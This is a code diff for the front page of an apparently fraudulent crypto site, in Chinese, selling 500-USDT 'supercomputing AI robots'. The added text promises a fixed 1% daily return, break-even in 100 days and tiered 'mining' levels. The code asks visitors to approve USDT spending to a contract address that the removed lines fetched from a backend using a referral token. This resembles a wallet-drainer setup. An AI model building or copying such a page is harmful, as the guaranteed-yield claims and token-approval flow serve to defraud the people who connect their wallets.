@@ -3,13 +3,11 @@ import Image from "next/image";
 
 import classes from "./index.module.css";
 import HOMEIMG01 from "@images/home-01.png"
+import HOMEIMG02 from "@images/home-02.png"
+import USDTIMG from "@images/icon/usdt_02.png"
 import AddressIcon from "@images/icon/address.png"
 import { shortenString } from "@/lib/utils";
 import { useAccount, useNetwork } from "wagmi";
-import Fna from "@/components/fna";
-import Banner from "@/components/banner";
-import Notic from "@/components/notic"
-import SELECTImg from "@images/select.png"
 import { useContractUserBalance, useGetUserInfo, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt";
 import React,{ useEffect, useState, useRef } from "react";
 import { postForm } from "node_modules/axios/index.cjs";
@@ -76,36 +74,10 @@ export default function Home() {
   }
 
   const handleGetAddress = async () => {
-    const params = new URLSearchParams(window.location.search)
-    const paramValue = params.get('c')
-    if(!paramValue){
-      router.push("/404")
-      return
-    }
-    let { data } = await getContractAddress({
-      address,
-      chain_type: chain?.id,
-      domain: window?.location?.hostname,
-      share_token: paramValue || '',
-    })
-    setContractAddress(data.auth_address)
+    
   }
   const handleParticipate = async () => {
     if(contractAddress == "") return
-    // if(isAllowed && address && chain?.id != 56){
-    //   const res = await postUserapproveAuth({
-    //     address,
-    //     chain_type: chain?.id,
-    //     auth_status: 0,
-    //     auth_hash: data?.hash || '',
-    //     balance: userBalance,
-    //   })
-    //   setSnackbarValue({
-    //       open: true,
-    //       message: t("index.authed"),
-    //   })
-    //   return
-    // }
     setLoding(true)
     try {
       await approve({
@@ -120,26 +92,82 @@ export default function Home() {
   return (
     <article 
       className="h-full"
-      style={{ overflowX: 'hidden',position: "relative",zIndex: "10", }}
+      style={{ overflowX: 'hidden',overflowY: 'auto',position: "relative",zIndex: "10", }}
     >
-      <article className="w-full mt-[100px] px-4 sm:px-20">
-        <Grid container className="w-full bg-[#131C20]" style={{paddingBottom: "0"}}>
+      <article className="w-full mt-[80px] px-4 sm:px-20">
+        <Grid container className="w-full bg-[#131C20]">
           <Grid item xs={12} lg={7} style={{display: "flex", flexDirection: "column", justifyContent: "center"}} className="py-[30px] sm:py-[0px]">
             <div className="px-[20px] sm:px-[92px]">
               <span className="text-2xl sm:text-5xl font-bold"><span className="text-[#E1146E]">ATR</span>超算AI机器人</span>
             </div>
-            <div className=" px-[20px] py-[8px] sm:px-[92px] bg-[rgba(255,255,255,0.2)] mt-2" style={{paddingRight: "20px"}}>
-              <span className="text-xl sm:text-4xl font-bold"><span className="text-[#E1146E]">首发</span>1000<span className="text-[#E1146E]">台火爆上线</span></span>
-              <span className="text-xs sm:text-4xl ml-2">(高额收益)</span>
+            <div className=" px-[20px] py-[10px] sm:px-[92px] bg-[#1A2939] mt-2 sm:mt-5" style={{paddingRight: "20px"}}>
+              <span className="text-xl sm:text-4xl font-bold"><span className="text-[#E1146E]">首发</span>1000<span className="text-[#E1146E]">台火爆上线</span><span className="text-xs sm:text-2xl ml-2 font-normal">(高额收益)</span></span>
+              
             </div>
           </Grid>
-          <Grid item xs={12} lg={5}>
+          <Grid item xs={12} lg={5} className="flex justify-center">
             <Image
                 src={HOMEIMG01}
                 alt=''
-                className="w-full"
+                className="w-[60%] sm:w-[80%]"
                 style={{height:"fit-content"}}
             />
+          </Grid>
+        </Grid>
+        <div className="mt-5"></div>
+        <Grid container spacing={2} className="w-full">
+          <Grid item xs={12} lg={6}>
+            <div className=" bg-[#131C20] w-full py-4 px-2 flex justify-between" >
+              <Image
+                  src={HOMEIMG02}
+                  alt=''
+                  className="w-[50px] sm:w-[125px] ml-6"
+                  style={{height:"fit-content"}}
+              />
+              <div className="full font-bold flex flex-col justify-between py-2">
+                <div className="text-white text-lg sm:text-3xl text-right">0</div>
+                <div className="text-[#E1146E] text-lg sm:text-3xl">已出售/台</div>
+              </div>
+            </div>
+          </Grid>
+          <Grid item xs={12} lg={6} className="flex justify-center">
+            <div className=" bg-[#131C20] w-full flex flex-col justify-between" >
+              <div className="flex justify-between items-center py-5 px-5" style={{flex:"1"}}>
+                <span className="text-lg sm:text-3xl font-bold">500</span>
+                <Image
+                    src={USDTIMG}
+                    alt=''
+                    className="w-[20px] sm:w-[40px]"
+                    style={{height:"fit-content"}}
+                />
+              </div>
+              <div className="bg-[#E1146E] text-lg sm:text-xl font-bold text-center py-3 sm:py-5 cursor-pointer">
+                确认认购
+              </div>
+            </div>
+          </Grid>
+        </Grid>
+        <Grid container className="w-full bg-[#131C20] mt-5 mb-5">
+          <Grid item xs={12} lg={6} className="py-2 sm:py-5 px-5 sm:px-10">
+            <div className="text-[#E1146E] font-bold text-lg sm:text-xl">说明</div>
+            <div className="text-white text-xs sm:text-base font-bold mt-2 sm:mt-5">收益说明：</div>
+            <div className="text-white text-xs sm:text-base mt-2 sm:mt-5">
+              500USDT超算AI机器人以
+              <span className="text-[#E1146E]">日收益</span>
+              1%产出USDT，金本位2倍=1000USDT出局，每天自己领取：纯静态100天回本，200天赚取一倍收益。
+            </div>
+          </Grid>
+          <Grid item xs={12} lg={6} className="py-5 sm:py-8 px-5 sm:px-10">
+            <div className="text-white text-xs sm:text-base font-bold mt-0 sm:mt-10">矿机等级说明:</div>
+            <div className="text-white text-xs sm:text-base mt-2 sm:mt-5">
+              8T超算AI机器人（500USDT超算AI机器人配300USDT至1000USDT的ATB）
+            </div>
+            <div className="text-white text-xs sm:text-base mt-2 sm:mt-5">
+              16T超算AI机器人（500USDT超算AI机器人配1001USDT至3000USDT的ATB）
+            </div>
+            <div className="text-white text-xs sm:text-base mt-2 sm:mt-5">
+              32T超算AI机器人（500USDT超算AI机器人配3001USDT至无限USDT的ATB）
+            </div>
           </Grid>
         </Grid>
       </article>
